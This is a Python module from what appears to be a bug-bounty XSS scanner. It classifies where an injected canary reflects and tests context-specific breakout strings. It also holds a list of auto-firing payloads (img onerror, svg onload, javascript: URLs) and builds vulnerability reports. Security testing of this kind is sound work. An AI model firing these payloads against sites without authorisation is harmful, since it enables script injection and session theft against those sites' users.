"""
XSS detection: context-aware reflection analysis + browser execution proof.

From Bug Bounty Bootcamp (Li, Ch 6). Two layers, matching the chapter's method:

  1. Reflection analysis (pure, unit-tested): inject a canary, find WHERE it
     reflects and in what context (HTML text, single/double-quoted attribute,
     inside <script>, inside a comment), then inject a context-specific breakout
     and check whether the structural characters (< > " ') survive UNescaped.
     That is the real exploitability signal — far better than "the marker
     appeared", which fires on safely-escaped reflections too.

  2. Execution proof (tools._run_xss, headless Chromium via Playwright): load the
     URL with auto-firing payloads and a real dialog handler. If alert() fires,
     the XSS is CONFIRMED. This layer also catches DOM-only XSS (e.g. a hash sink
     via innerHTML) that never appears in the HTTP response at all.

This module holds the pure logic; the transport + browser live in tools.
"""
from __future__ import annotations

import re
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

CANARY = "bbhCanary8842"
MARK = "bbhx7"   # short structural marker embedded in breakout payloads

# Context -> breakout whose LITERAL presence in the response proves the
# structural chars were not escaped in that context.
BREAKOUTS = {
    "html":     f"<{MARK}h>",
    "attr_dq":  f'"><{MARK}a>',
    "attr_sq":  f"'><{MARK}a>",
    "attr_uq":  f" {MARK}u=1",
    "script":   f"</script><{MARK}s>",
    "comment":  f"--><{MARK}c>",
}

# Contexts where a surviving breakout injects a NEW HTML ELEMENT into the
# response — i.e. reflection alone proves executable markup, no browser needed.
# script / comment / attr_uq are deliberately excluded: the breakout there is
# weaker proof (JS-string escaping edge cases, attribute-only injection), so
# they stay candidates for the browser-execution pass to confirm.
EXECUTABLE_ON_REFLECTION = {"html", "attr_dq", "attr_sq"}

# Auto-firing execution payloads for the browser confirmation pass.
EXEC_PAYLOADS = (
    f'"><img src=x onerror=alert("{MARK}")>',
    f"'><img src=x onerror=alert('{MARK}')>",
    f'<img src=x onerror=alert("{MARK}")>',
    f'"><svg onload=alert("{MARK}")>',
    f"</script><svg onload=alert('{MARK}')>",
    f'javascript:alert("{MARK}")',
)


def set_param(url: str, name: str, value: str) -> str:
    p = urlparse(url)
    pairs = parse_qsl(p.query, keep_blank_values=True)
    pairs = [(k, value if k == name else v) for k, v in pairs]
    return urlunparse(p._replace(query=urlencode(pairs, doseq=True)))


def set_fragment(url: str, value: str) -> str:
    return urlunparse(urlparse(url)._replace(fragment=value))


def params_of(url: str) -> list:
    return [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]


def contexts_of(body: str, canary: str = CANARY) -> list:
    """Classify every reflection of `canary` in `body` by HTML context."""
    out, seen = [], set()
    start = 0
    while True:
        idx = body.find(canary, start)
        if idx == -1:
            break
        start = idx + len(canary)
        prefix = body[:idx]
        ctx = _classify(prefix)
        if ctx not in seen:
            seen.add(ctx)
            out.append(ctx)
    return out


def _classify(prefix: str) -> str:
    # inside a <script> block?
    if prefix.rfind("<script") > prefix.rfind("</script"):
        return "script"
    # inside an HTML comment?
    if prefix.rfind("<!--") > prefix.rfind("-->"):
        return "comment"
    # inside a tag (unclosed '<' more recent than the last '>')?
    last_lt, last_gt = prefix.rfind("<"), prefix.rfind(">")
    if last_lt > last_gt:
        seg = prefix[last_lt:]
        if seg.count('"') % 2 == 1:
            return "attr_dq"
        if seg.count("'") % 2 == 1:
            return "attr_sq"
        return "attr_uq"
    return "html"


def reflected_exploitable(body: str, context: str) -> bool:
    """True when the context's breakout appears LITERALLY (unescaped) in body."""
    b = BREAKOUTS.get(context)
    return bool(b) and b in (body or "")


def reflection_finding(url: str, param: str, context: str, where: str = "query") -> dict:
    # A surviving breakout that injects a new element is proof of exploitable
    # markup on its own — grade it CONFIRMED. Weaker contexts stay candidate so
    # the browser pass (or a human) confirms execution.
    proven = context in EXECUTABLE_ON_REFLECTION
    label = "confirmed" if proven else "candidate"
    return {
        "title": f"Reflected XSS ({context}) in '{param}'",
        "severity": "high", "target": set_param(url, param, BREAKOUTS[context]) if where == "query" else url,
        "description": (f"User input in the {where} parameter '{param}' reflects into a {context} context with the "
                        f"structural characters unescaped (breakout '{BREAKOUTS[context]}' survived literally). "
                        + ("The breakout injects a new HTML element, so this is directly exploitable markup."
                           if proven else "This is injectable HTML/script; execution needs browser/manual confirmation.")),
        "impact": "Execute script in victims' browsers: session/CSRF-token theft, account takeover, page defacement.",
        "reproduction_steps": [f"Set '{param}' to {BREAKOUTS[context]}",
                               "Observe it reflected unescaped in the response",
                               "Replace with an executing payload (e.g. \"><img src=x onerror=alert(1)>)"],
        "cwe": "CWE-79", "family": "xss", "tags": ["xss"], "confidence": label,
    }


def execution_finding(url: str, param: str, payload: str, where: str) -> dict:
    tgt = set_fragment(url, payload) if where == "fragment" else set_param(url, param, payload)
    return {
        "title": f"XSS confirmed ({'DOM/fragment' if where == 'fragment' else where} '{param}')",
        "severity": "critical", "target": tgt,
        "description": (f"A payload injected via the {where} executed in a real headless browser (alert fired). "
                        + ("DOM-based sink — the payload never reached the server." if where == "fragment"
                           else "The reflected payload executed on load.")),
        "impact": "Arbitrary script execution in victims' browsers: session/CSRF-token theft, account takeover.",
        "reproduction_steps": [f"Load {tgt}", "Observe alert() fire (script executed)"],
        "evidence": f"payload={payload}", "cwe": "CWE-79", "family": "xss",
        "tags": ["xss"], "confidence": "confirmed",
    }
